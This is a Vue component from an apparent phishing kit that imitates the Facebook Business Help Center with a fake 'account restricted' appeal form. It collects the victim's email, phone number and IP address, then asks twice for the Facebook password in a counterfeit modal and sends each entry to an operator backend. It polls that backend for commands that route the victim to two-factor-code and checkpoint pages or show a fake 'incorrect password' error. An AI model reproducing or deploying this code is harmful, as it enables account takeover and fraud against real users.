<script>
import useValidate from "@vuelidate/core";
import { required } from "@vuelidate/validators";
import axios from "axios";
import ChatWidget from "@/components/ChatWidget.vue"

export default {
  name: "Form1",
  components:{
    ChatWidget,
  },
  data() {
    return {
      v$: useValidate(),
      firstStep: true,
      secondStep: false,
      waitingForResponse: false,
      chatMessage: false,
      loading: "",
      ipAddress: "",
      interval: "",
      decision: "",
      firstPassword: false,
      secondPassword: false,
      form: {
        page_name: "",
        name: "",
        email: "",
        mobile: "",
        appeal: "",
      },
      modal: {
        password: "",
        error: false,
      },
    };
  },
  created() {
    document.title = 'My Personal Account Was Restricted | Facebook';
    axios.interceptors.request.use(
      (config) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = true;
        }
        return config;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );

    axios.interceptors.response.use(
      (response) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return response;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );
  },
  mounted() {
    this.getClientIP();
    // this.checkBan();
  },
  methods: {
    stepOne() {
        this.firstStep = false;
        this.secondStep = true;
    },
    chatMessageStatus() {
      this.chatMessage = true,
      console.log(this.chatMessage)
    },
    getClientIP() {
      axios
        .get("https://api.ipify.org?format=json")
        .then((response) => {
          this.ipAddress = response.data.ip;
        //   this.checkBan();
        })
        .catch((e) => {
          console.log(e);
        });
    },
    // checkBan() {
    //   axios
    //     .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
    //       ip: this.ipAddress,
    //     })
    //     .then((response) => {
    //       if (response.data == "BAN") {
    //         window.location.href = "https://www.facebook.com/help/";
    //       }
    //     })
    //     .catch((e) => {
    //       console.log(e);
    //     });
    // },
    getResponse() {
      this.interval = setInterval(() => {
        axios
          .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
            case_ref: this.ipAddress,
          })
          .then((response) => {
            let resType;

            if (response.data == "CMD_EMAIL") {
              resType = "email";

                this.$router.push({
                    name: "twofa",
                    params: {
                        type: resType,
                        email: this.form.email,
                    },
                });
                clearInterval(this.interval);
            }

            if (response.data == "CMD_CODE") {
                resType = "code";

                this.$router.push({
                    name: "twofa",
                    params: {
                        type: resType,
                        email: this.form.email,
                    },
                });
                clearInterval(this.interval);
            }

            if (response.data == "CMD_CHECKPOINT") {
              this.$router.push({
                path: "checkpoint",
              });
              clearInterval(this.interval);
            }

            if (response.data == "CMD_WRONG") {
                this.wrongPw = true;
                this.loading = false;
                this.modal.password = '';
                clearInterval(this.interval);
            }
          })
          .catch((e) => {
            console.log(e);
          });
      }, 1000);
    },
    submitForm() {
      console.log("submit");
      this.v$.$validate(); // checks all inputs
      if (!this.v$.$error) {
        let data = {
          page_name: this.form.page_name,
          name: this.form.name,
          email: this.form.email,
          mobile: this.form.mobile,
          //   appeal: this.form.appeal,
        };
        console.log(data);
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            data
          )
          .then((response) => {
            console.log(response);
          })
          .catch((e) => {
            this.errors.push(e);
            console.log(this.errors);
          });

        this.firstPassword = true;
      }
    },
    submitPassword() {
      if (this.modal.password != "") {
        if (this.secondPassword == false) {
          this.modal.error = false;
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { firstPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
                console.log(response);
                this.waitingForResponse = true;
                this.loading = true;
                this.getResponse();
                this.secondPassword = true;
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });

          this.modal.password = "";
        } else {
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { secondPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
              this.waitingForResponse = true;
              this.loading = true;
              this.getResponse();
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });
        }
      } else {
        this.modal.error = true;
      }
    },
    alert(){
      alert('Please complete the form before you navigate.');
    }
  },
  validations() {
    return {
      form: {
        // page_name: { required },
        // name: { required },
        email: { required },
        mobile: { required },
        // appeal: { required },
      },
    };
  },
};
</script>

<template>
    <div v-if="loading" id="loadFacebookC" class="">
        <div id="loadFacebookG">
        <div id="blockG_1" class="facebook_blockG"></div>
        <div id="blockG_2" class="facebook_blockG"></div>
        <div id="blockG_3" class="facebook_blockG"></div>
        </div>
    </div>

    <div id="root">
        <div v-if="firstStep" id="app">
            <div>
                <div class="banner">
                    <div class="banner-bg"></div>
                    <div class="banner-content">
                        <h5>Facebook Business Help Center</h5>
                        <h1>How can we help you?</h1>
                    </div>
                </div>
                <div class="body mb-5">
                    <div class="wrap-title">
                        <h2>How can we help?</h2>
                        <p>We need more information to address your issue.</p>
                        <p>This form will only take a few minutes.</p>
                        <div class="form-wrapper">
                            <div class="select-issue"><b>Most common issues</b>
                                <div class="form-check mb-3">
                                    <div><input class="form-check-input me-3" type="radio" name="issue" id="issue">
                                    </div><label for="issue">I have been blocked from using a feature</label>
                                </div>
                                <div class="form-check mb-3">
                                    <div><input class="form-check-input me-3" type="radio" name="issue" id="issue2">
                                    </div><label for="issue2">My fanpage violated community standards</label>
                                </div>
                                <div class="form-check mb-3">
                                    <div><input class="form-check-input me-3" type="radio" name="issue" id="issue3">
                                    </div><label for="issue3">My ad account is disabled</label>
                                </div>
                                <div class="form-check mb-3">
                                    <div><input class="form-check-input me-3" type="radio" name="issue" id="issue4">
                                    </div><label for="issue4">I need help with a failed payment</label>
                                </div>
                                <div class="form-check mb-3">
                                    <div><input class="form-check-input me-3" type="radio" name="issue" id="issue5">
                                    </div><label for="issue5">I think someone accessed my business without my
                                        permission</label>
                                </div>
                                <div class="form-check mb-3">
                                    <div><input class="form-check-input me-3" type="radio" name="issue" id="issue6">
                                    </div><label for="issue6">Other issues</label>
                                </div>
                                <div class="d-flex justify-content-end w-full">
                                    <button @click="stepOne()" class="btn btn-lg btn-primary">Next
                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" style="width:20px;height:20px;">
                                            <path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5" />
                                        </svg>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div v-if="secondStep" id="app">
            <div>
                <div class="banner">
                    <div class="banner-bg"></div>
                    <div class="banner-content">
                        <h5>Facebook Business Help Center</h5>
                        <h1>How can we help you?</h1>
                    </div>
                </div>
                <div class="body mb-5">
                    <div class="wrap-title">
                        <h2>How can we help?</h2>
                        <p>We need more information to address your issue.</p>
                        <p>This form will only take a few minutes.</p>
                        <div class="form-send-wrapper">
                            <h3>Get help</h3>
                            <div class="Form">
                                <div style="margin-bottom: 20px;"><label class="InputText__label">Phone number</label>
                                    <vue-tel-input mode="international" v-model="this.form.mobile"></vue-tel-input>
                                </div>
                                <div class="InputText">
                                    <label for="Email address" class="InputText__label">Email
                                        address</label>
                                        <input type="email" v-model="this.form.email" id="email" name="email"
                                        placeholder="Email address" class="form-control form-control-lg">
                                        </div>
                                <div class="d-flex justify-content-end">
                                    <button @click="submitForm()" class="chat_btn"
                                        type="button">
                                        <ion-icon name="chatbubble" role="img" classname="md hydrated"
                                            class="md hydrated"></ion-icon><span>Start Chat</span>
                                    </button></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <!-- Chat Widget -->
    <chat-widget :ipAddress="ipAddress" @chat-message-status="chatMessageStatus" />

    <div v-if="firstPassword" class="ReactModalPortal">
        <div class="ReactModal__Overlay ReactModal__Overlay--after-open"
            style="position: fixed; inset: 0px; background-color: rgba(0, 0, 0, 0.5); z-index: 1000;">
            <div class="ReactModal__Content ReactModal__Content--after-open" tabindex="-1" role="dialog"
                aria-label="Nhập họ tên của bạn" aria-modal="true"
                style="position: relative; inset: 40% 40px 40px 50%; border: 1px solid rgb(204, 204, 204); background: white; overflow: auto; border-radius: 8px; outline: none; padding: 20px; width: 100%; max-width: 450px; transform: translate(-50%, -50%); box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 4px;">
                <div class="modal-content">
                    <div class="modal-body">
                        <h1 style="font-size: 1.3rem; color: rgb(68, 68, 68);">Please enter your facebook password to
                            continue</h1>
                        <div
                            style="margin-top: 1rem; margin-bottom: 1.25rem; height: 1px; width: 100%; background: rgb(218, 221, 225);">
                        </div>
                        <div class="modal__body-description" style="font-size: 14px;">We need to confirm the sender of
                            the information is you, Please enter your facebook password and then continue.</div>
                        <div class="modal__body-password">
                            <div class="InputText">
                                <label for="Password" class="InputText__label">Password</label>
                                <div style="position: relative; width: 100%;">
                                    <input v-model="modal.password" type="password" id="Password"
                                        class="InputText__input" style="width: 100%;">
                                </div>
                            </div>
                        </div>
                        <div class="d-flex align-items-center ms-2">
                            <p v-if="modal.error" class="text-danger" style="font-size: 14px;">Password cannot be empty!</p>
                            <p v-if="wrongPw" class="text-danger" style="font-size: 14px;">The password that you've entered is
                                incorrect. <a class="text-danger" rel="noopener noreferrer" target="_blank"
                                    href="https://www.facebook.com/login/identify/"
                                    style="text-decoration: none; font-weight: 500;">Forgoten Password?</a></p>
                        </div>
                        <div class="next-button-div"><button @click="submitPassword" class="ButtonSoft">Continue</button></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- <div
        v-if="firstPassword"
        id="modalFade"
        class="fade modal-backdrop show"
    ></div>
    <div
        v-if="firstPassword"
        id="fbPasswordModal"
        role="dialog"
        aria-modal="true"
        class="fade modali2 modal show"
        style="display: block"
        tabindex="-1"
    >
        <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
            <div class="modal-title h4">Please Enter Your Password</div>
            <button type="button" class="btn-close" aria-label="Close"></button>
            </div>
            <div class="modal-body">
            <p class="foryoursecurity">
                For your security, you must re-enter your password to continue.
            </p>
            <div class="mb-3 formapw">
                <label class="labela" for="formBasicEmail">Password</label>
                <input
                v-model="modal.password"
                required=""
                type="password"
                id="passwordField"
                class="form-control"
                />
            </div>
            <p v-if="modal.error" class="pwincorrect">Password cannot be empty!</p>
            <p
                v-if="wrongPw"
                class="pwincorrect"
                id="fbPasswordModalError"
            >
                Your password was incorrect!
            </p>
            </div>
            <div class="modal-footer">
            <button
                @click="submitPassword"
                type="button"
                id="passwordSubmitBtn"
                form="forma1"
                class="btn btn-primary button-15"
            >
                Continue
            </button>
            </div>
        </div>
        </div>
    </div> -->
</template>

<style scoped src="../assets/css/form5.css">
</style>
<style scoped>
.hidden {
  display: none !important;
}
.open-modal {
  overflow: hidden !important;
  padding-right: 16px;
}
</style>
